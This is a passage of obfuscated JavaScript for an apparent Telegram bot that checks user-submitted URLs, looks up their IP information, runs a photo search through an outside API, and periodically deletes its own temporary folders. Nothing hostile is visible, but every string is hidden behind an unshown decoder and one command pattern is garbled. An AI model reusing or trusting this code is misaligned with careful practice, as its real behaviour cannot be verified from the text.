    bot[_0x328ff4(0x326) + 'e'](_0x445402, _0x3cea8e[_0x328ff4(0x7d7)], _0x394f7f);
}), bot['on'](_0x247cf0(0x293) + _0x247cf0(0x43c), _0xd6db2c => {
    const _0x2f8dca = _0x247cf0, _0x2ac34b = {
            'uHdAJ': function (_0x88d329, _0x4420de) {
                return _0x88d329 === _0x4420de;
            },
            'rwoMc': _0x2f8dca(0x4f3) + 's',
            'ttMvq': _0x2f8dca(0x350) + _0x2f8dca(0x823) + _0x2f8dca(0x5f1)
        }, _0x40f44d = _0xd6db2c[_0x2f8dca(0x202)][_0x2f8dca(0x742)]['id'];
    _0x2ac34b[_0x2f8dca(0x6ec)](_0xd6db2c[_0x2f8dca(0x70e)], _0x2ac34b[_0x2f8dca(0x76c)]) && (bot[_0x2f8dca(0x326) + 'e'](_0x40f44d, _0x2ac34b[_0x2f8dca(0x77a)]), waiting_for_link[_0x40f44d] = !![]);
}), bot['on'](_0x247cf0(0x202), async _0x4cd65c => {
    const _0x322752 = _0x247cf0, _0x2ce18e = {
            'lMwYD': function (_0x25e032, _0x1277ef) {
                return _0x25e032(_0x1277ef);
            },
            'BcIwX': _0x322752(0x735) + _0x322752(0x3a5) + _0x322752(0x6cd),
            'aZxMW': _0x322752(0x947) + _0x322752(0x6e2) + _0x322752(0x5df) + '%',
            'JDlCi': function (_0xbae978, _0x5e809b) {
                return _0xbae978(_0x5e809b);
            },
            'rQoHZ': _0x322752(0x947) + _0x322752(0x739) + _0x322752(0x770) + '5%',
            'EnSZQ': function (_0x7cf3a5, _0x1fe43b) {
                return _0x7cf3a5(_0x1fe43b);
            },
            'rVGbI': _0x322752(0x947) + _0x322752(0x1c8) + _0x322752(0x5c1) + '0%',
            'qQcAo': _0x322752(0x947) + _0x322752(0x1c8) + _0x322752(0x6b0) + '5%',
            'JpNMQ': function (_0x1acafb, _0xc46529) {
                return _0x1acafb(_0xc46529);
            },
            'mDUTq': _0x322752(0x947) + _0x322752(0x1c8) + _0x322752(0x2b4) + _0x322752(0x654),
            'uLWsu': function (_0x57c5f6, _0x527fbb) {
                return _0x57c5f6 === _0x527fbb;
            },
            'lzqzg': _0x322752(0x382),
            'zBQzE': _0x322752(0x6a4) + _0x322752(0x4a1) + _0x322752(0x94f) + _0x322752(0x812),
            'GMgjs': function (_0x3d89d6, _0x3728f7) {
                return _0x3d89d6 === _0x3728f7;
            },
            'dzzMq': _0x322752(0x6eb),
            'dBAOB': _0x322752(0x425) + _0x322752(0x5c0) + _0x322752(0x1ef) + _0x322752(0x965) + _0x322752(0x728) + _0x322752(0x2bb) + _0x322752(0x420) + _0x322752(0x1fc) + _0x322752(0x228) + _0x322752(0x2d4) + _0x322752(0x440) + _0x322752(0x63c) + _0x322752(0x5bf) + _0x322752(0x69b) + _0x322752(0x2ae) + _0x322752(0x643) + _0x322752(0x59f) + _0x322752(0x67a) + _0x322752(0x6c3) + _0x322752(0x465) + _0x322752(0x201),
            'IQiAJ': function (_0x54d74c, _0x261d69) {
                return _0x54d74c === _0x261d69;
            },
            'VvqXV': _0x322752(0x5d5) + '🔴',
            'dRmlP': _0x322752(0x6fe) + _0x322752(0x43f) + _0x322752(0x64e) + _0x322752(0x5e9) + _0x322752(0x7a8) + _0x322752(0x5e8) + _0x322752(0x4c8) + _0x322752(0x61f) + _0x322752(0x377) + _0x322752(0x6ab) + _0x322752(0x2c0) + _0x322752(0x437) + _0x322752(0x1eb) + _0x322752(0x971) + _0x322752(0x73e) + _0x322752(0x85e) + _0x322752(0x6f6),
            'CbgpJ': function (_0x401bb7, _0x1b788d) {
                return _0x401bb7 || _0x1b788d;
            },
            'sICCw': _0x322752(0x51f) + _0x322752(0x7a3),
            'HPtBf': _0x322752(0x68b)
        }, _0x1dc8b8 = _0x4cd65c[_0x322752(0x742)]['id'], _0x214062 = _0x4cd65c[_0x322752(0x814)];
    if (waiting_for_link[_0x1dc8b8]) {
        if (!_0x2ce18e[_0x322752(0x5ea)](isValidUrl, _0x214062)) {
            bot[_0x322752(0x326) + 'e'](_0x1dc8b8, _0x2ce18e[_0x322752(0x636)]);
            return;
        }
        let _0x25a1c1 = await bot[_0x322752(0x326) + 'e'](_0x1dc8b8, _0x2ce18e[_0x322752(0x784)]);
        await _0x2ce18e[_0x322752(0x6e5)](sleep, 0x1 * 0x587 + 0xe * -0xac + 0x1381), bot[_0x322752(0x472) + _0x322752(0x710)](_0x2ce18e[_0x322752(0x74f)], {
            'chat_id': _0x1dc8b8,
            'message_id': _0x25a1c1[_0x322752(0x4a4)]
        }), await _0x2ce18e[_0x322752(0x2f9)](sleep, 0xa0a * -0x2 + 0x4ca * 0x5 + 0xbc2), bot[_0x322752(0x472) + _0x322752(0x710)](_0x2ce18e[_0x322752(0x328)], {
            'chat_id': _0x1dc8b8,
            'message_id': _0x25a1c1[_0x322752(0x4a4)]
        }), await _0x2ce18e[_0x322752(0x5ea)](sleep, -0x6 * 0x101 + -0x7c4 + -0x1d6a * -0x1), bot[_0x322752(0x472) + _0x322752(0x710)](_0x2ce18e[_0x322752(0x7cb)], {
            'chat_id': _0x1dc8b8,
            'message_id': _0x25a1c1[_0x322752(0x4a4)]
        }), await _0x2ce18e[_0x322752(0x3f9)](sleep, 0x1f37 + 0x1fdf + -0x2f76), bot[_0x322752(0x472) + _0x322752(0x710)](_0x2ce18e[_0x322752(0x871)], {
            'chat_id': _0x1dc8b8,
            'message_id': _0x25a1c1[_0x322752(0x4a4)]
        }), await _0x2ce18e[_0x322752(0x5ea)](sleep, 0x247d * 0x1 + -0x2b * 0x5 + 0x1de * -0x11), bot[_0x322752(0x575) + _0x322752(0x2fb)](_0x1dc8b8, _0x25a1c1[_0x322752(0x4a4)]);
        const _0x58e129 = _0x2ce18e[_0x322752(0x5ea)](checkUrl, _0x214062), _0x26ab31 = await _0x2ce18e[_0x322752(0x6e5)](extractIpFromUrl, _0x214062), _0x316e7e = _0x26ab31 ? await _0x2ce18e[_0x322752(0x3f9)](getIpInfo, _0x26ab31) : {};
        let _0x41001a = '';
        if (_0x2ce18e[_0x322752(0x803)](_0x58e129, _0x2ce18e[_0x322752(0x725)]))
            _0x41001a = _0x2ce18e[_0x322752(0x526)];
        else {
            if (_0x2ce18e[_0x322752(0x6fb)](_0x58e129, _0x2ce18e[_0x322752(0x6c7)]))
                _0x41001a = _0x2ce18e[_0x322752(0x3c1)];
            else
                _0x2ce18e[_0x322752(0x460)](_0x58e129, _0x2ce18e[_0x322752(0x508)]) && (_0x41001a = _0x2ce18e[_0x322752(0x69f)]);
        }
        const _0x565e1f = _0x322752(0x8af) + _0x322752(0x590) + _0x214062 + (_0x322752(0x24f) + _0x322752(0x76e) + ':\x20') + _0x58e129 + (_0x322752(0x24f) + _0x322752(0x33e) + _0x322752(0x8d4)) + _0x41001a + (_0x322752(0x24f) + _0x322752(0x562) + _0x322752(0x87e)) + _0x2ce18e[_0x322752(0x64c)](_0x26ab31, _0x2ce18e[_0x322752(0x7b0)]) + (_0x322752(0x24f) + _0x322752(0x975) + _0x322752(0x7df)) + (_0x316e7e[_0x322752(0x7ea)] || _0x2ce18e[_0x322752(0x399)]) + _0x322752(0x847);
        bot[_0x322752(0x326) + 'e'](_0x1dc8b8, _0x565e1f), waiting_for_link[_0x1dc8b8] = ![];
    } else
        bot[_0x322752(0x326) + 'e'](_0x1dc8b8, '');
});
const currentSearch = {};
bot[_0x247cf0(0x89b)](/\/stاههلىنححظةرلrt/, _0x4d38b1 => {
    const _0x27c9b6 = _0x247cf0, _0x2cdaf0 = {
            'NNnSb': _0x27c9b6(0x3e5),
            'VKEbL': _0x27c9b6(0x3a8) + _0x27c9b6(0x7eb),
            'qSuNY': _0x27c9b6(0x27c) + _0x27c9b6(0x838) + _0x27c9b6(0x8ca) + _0x27c9b6(0x8c6) + _0x27c9b6(0x212) + _0x27c9b6(0x806) + '-'
        }, _0x3bc76d = _0x4d38b1[_0x27c9b6(0x742)]['id'], _0x27ea9c = {
            'reply_markup': {
                'inline_keyboard': [[{
                            'text': _0x2cdaf0[_0x27c9b6(0x6db)],
                            'callback_data': _0x2cdaf0[_0x27c9b6(0x840)]
                        }]]
            }
        };
    bot[_0x27c9b6(0x326) + 'e'](_0x3bc76d, _0x2cdaf0[_0x27c9b6(0x1d2)], _0x27ea9c);
}), bot['on'](_0x247cf0(0x293) + _0x247cf0(0x43c), async _0x258266 => {
    const _0x42560a = _0x247cf0, _0x276dbf = {
            'zZnqK': function (_0x1589c2, _0x5748fc) {
                return _0x1589c2 === _0x5748fc;
            },
            'yCWGQ': _0x42560a(0x3a8) + _0x42560a(0x7eb),
            'khniH': function (_0x20b798, _0x162a7f) {
                return _0x20b798 === _0x162a7f;
            },
            'lFeHY': _0x42560a(0x434) + _0x42560a(0x493),
            'aUvSI': _0x42560a(0x796) + _0x42560a(0x747) + _0x42560a(0x53c) + _0x42560a(0x448) + _0x42560a(0x68d),
            'LxJrg': _0x42560a(0x2d6) + _0x42560a(0x756) + _0x42560a(0x5aa) + _0x42560a(0x39f) + _0x42560a(0x26e) + _0x42560a(0x7c2) + _0x42560a(0x58f) + _0x42560a(0x65e) + _0x42560a(0x723) + _0x42560a(0x8a4) + _0x42560a(0x738) + _0x42560a(0x7f4) + _0x42560a(0x686) + _0x42560a(0x8dd) + _0x42560a(0x5f4) + _0x42560a(0x4bc) + _0x42560a(0x3e2) + '\x20'
        }, _0x3a40a9 = _0x258266[_0x42560a(0x202)][_0x42560a(0x742)]['id'];
    _0x276dbf[_0x42560a(0x65b)](_0x258266[_0x42560a(0x70e)], _0x276dbf[_0x42560a(0x6de)]) && (_0x276dbf[_0x42560a(0x4ab)](currentSearch[_0x3a40a9], _0x276dbf[_0x42560a(0x6a5)]) ? bot[_0x42560a(0x326) + 'e'](_0x3a40a9, _0x276dbf[_0x42560a(0x322)]) : (bot[_0x42560a(0x326) + 'e'](_0x3a40a9, _0x276dbf[_0x42560a(0x7b4)]), currentSearch[_0x3a40a9] = _0x276dbf[_0x42560a(0x6a5)]));
}), bot['on'](_0x247cf0(0x202), async _0x1b26a4 => {
    const _0x34e640 = _0x247cf0, _0x580f5f = {
            'qKRJk': function (_0x195069, _0x40e451) {
                return _0x195069 === _0x40e451;
            },
            'pqRoG': _0x34e640(0x434) + _0x34e640(0x493),
            'Ejjuv': function (_0x1af2e4, _0x2fc0ac) {
                return _0x1af2e4(_0x2fc0ac);
            },
            'hMryx': function (_0x4267a0, _0x4db8da) {
                return _0x4267a0 === _0x4db8da;
            },
            'fOLIC': _0x34e640(0x4c7) + _0x34e640(0x76b) + _0x34e640(0x6bd),
            'UKiTP': function (_0x32c420, _0x493735) {
                return _0x32c420 < _0x493735;
            },
            'qaZAP': function (_0x34bb56, _0x16d6ee) {
                return _0x34bb56 + _0x16d6ee;
            },
            'vHNxG': _0x34e640(0x71b) + _0x34e640(0x241) + _0x34e640(0x87c) + _0x34e640(0x49c),
            'zrkdo': function (_0x53c5e1, _0x42fac7) {
                return _0x53c5e1 !== _0x42fac7;
            }
        }, _0x140cc6 = _0x1b26a4[_0x34e640(0x742)]['id'];
    if (_0x580f5f[_0x34e640(0x3df)](currentSearch[_0x140cc6], _0x580f5f[_0x34e640(0x87f)])) {
        const _0x2c63bf = _0x1b26a4[_0x34e640(0x814)], _0x9a6b62 = _0x34e640(0x4e7) + _0x34e640(0x84c) + _0x34e640(0x21a) + _0x34e640(0x3be) + _0x34e640(0x716) + _0x34e640(0x743) + _0x34e640(0x557) + _0x34e640(0x3ce) + _0x34e640(0x903) + _0x580f5f[_0x34e640(0x24d)](encodeURIComponent, _0x2c63bf) + (_0x34e640(0x3d8) + _0x34e640(0x35b) + _0x34e640(0x79b)) + _0x580f5f[_0x34e640(0x24d)](encodeURIComponent, _0x2c63bf) + (_0x34e640(0x39a) + _0x34e640(0x413) + _0x34e640(0x929) + _0x34e640(0x532) + _0x34e640(0x20f));
        try {
            const _0x43a8ec = await axios[_0x34e640(0x3d0)](_0x9a6b62), _0x38a592 = _0x43a8ec[_0x34e640(0x70e)][_0x34e640(0x8b3) + _0x34e640(0x463)]?.[_0x34e640(0x70e)]?.[_0x34e640(0x7bd)] || [];
            if (_0x580f5f[_0x34e640(0x495)](_0x38a592[_0x34e640(0x934)], -0x4 * 0x5fc + 0x1ae2 + -0x2f2)) {
                bot[_0x34e640(0x326) + 'e'](_0x140cc6, _0x580f5f[_0x34e640(0x36a)]), delete currentSearch[_0x140cc6];
                return;
            }
            for (let _0x4397b8 = 0x26 * 0x6 + -0x45a * -0x2 + -0x266 * 0x4; _0x580f5f[_0x34e640(0x5fb)](_0x4397b8, _0x38a592[_0x34e640(0x934)]); _0x4397b8++) {
                const _0x3820cd = _0x38a592[_0x4397b8], _0x2ebb9f = _0x3820cd[_0x34e640(0x2cd)]?.[_0x34e640(0x8cc)]?.[_0x34e640(0x27f)];
                _0x2ebb9f ? bot[_0x34e640(0x7e9)](_0x140cc6, _0x2ebb9f, { 'caption': _0x34e640(0x468) + _0x580f5f[_0x34e640(0x2a5)](_0x4397b8, 0xe9d * 0x1 + 0xc3a + -0x1ad6) }) : bot[_0x34e640(0x326) + 'e'](_0x140cc6, _0x580f5f[_0x34e640(0x4f5)]);
            }
            delete currentSearch[_0x140cc6];
        } catch (_0x30e82d) {
            bot[_0x34e640(0x326) + 'e'](_0x140cc6, _0x34e640(0x7a2) + _0x30e82d[_0x34e640(0x202)]), delete currentSearch[_0x140cc6];
        }
    } else {
        if (!currentSearch[_0x140cc6])
            bot[_0x34e640(0x326) + 'e'](_0x140cc6, '');
        else
            _0x580f5f[_0x34e640(0x985)](currentSearch[_0x140cc6], _0x580f5f[_0x34e640(0x87f)]) && bot[_0x34e640(0x326) + 'e'](_0x140cc6, '');
    }
});
const clearTemporaryStorage = () => {
    const _0x19f107 = _0x247cf0, _0x358d07 = {
            'lwjrT': function (_0x5ae8b0, _0x2ae6f4) {
                return _0x5ae8b0(_0x2ae6f4);
            },
            'tNumB': _0x19f107(0x4c1) + _0x19f107(0x4b5) + _0x19f107(0x1f8),
            'UyRtc': _0x19f107(0x8d8),
            'KTbWZ': _0x19f107(0x896),
            'XPWem': _0x19f107(0x2cd),
            'VXlxE': _0x19f107(0x720) + _0x19f107(0x2db) + _0x19f107(0x475) + _0x19f107(0x3db)
        };
    try {
        console[_0x19f107(0x6e8)](_0x358d07[_0x19f107(0x7d8)]);
        const _0x1381d0 = [
            _0x358d07[_0x19f107(0x662)],
            _0x358d07[_0x19f107(0x8a8)],
            _0x358d07[_0x19f107(0x356)]
        ];
        _0x1381d0[_0x19f107(0x7bb)](_0x547a04 => {
            const _0x3062bc = _0x19f107, _0x15c874 = path[_0x3062bc(0x93f)](__dirname, _0x547a04);
            fs[_0x3062bc(0x817)](_0x15c874) ? (_0x358d07[_0x3062bc(0x442)](deleteFolderRecursive, _0x15c874), console[_0x3062bc(0x6e8)](_0x3062bc(0x2b7) + _0x3062bc(0x730) + _0x15c874)) : console[_0x3062bc(0x6e8)](_0x3062bc(0x2f3) + _0x3062bc(0x3ec) + _0x15c874);
        });
    } catch (_0x9f24bf) {
        console[_0x19f107(0x541)](_0x358d07[_0x19f107(0x574)], _0x9f24bf);
    }
};
setInterval(() => {
    const _0x41916c = _0x247cf0, _0x174681 = {
            'YCdih': function (_0x26aefd) {
                return _0x26aefd();
            },
            'QTzuZ': _0x41916c(0x6f7) + _0x41916c(0x769) + _0x41916c(0x43b)
        };
    _0x174681[_0x41916c(0x8de)](clearTemporaryStorage), console[_0x41916c(0x6e8)](_0x174681[_0x41916c(0x6a3)]);
}, (0x1 * 0x1903 + 0x26e * 0x9 + 0xa9 * -0x47) * (-0x199f + 0x425 * 0x8 + -0x74d) * (0x17da + 0x4 * 0xb6 + -0x16ca));
const handleExit = () => {
    const _0x144b56 = _0x247cf0, _0x512f68 = {
            'AAXUn': _0x144b56(0x782) + _0x144b56(0x56a) + _0x144b56(0x33f) + _0x144b56(0x336),
            'AIOqt': function (_0x191189) {
                return _0x191189();
            }
        };
    console[_0x144b56(0x6e8)](_0x512f68[_0x144b56(0x1d1)]), _0x512f68[_0x144b56(0x7ce)](clearTemporaryStorage), process[_0x144b56(0x779)]();
};
process['on'](_0x247cf0(0x779), handleExit), process['on'](_0x247cf0(0x6d6), handleExit), process['on'](_0x247cf0(0x6f0), handleExit), process['on'](_0x247cf0(0x284), handleExit);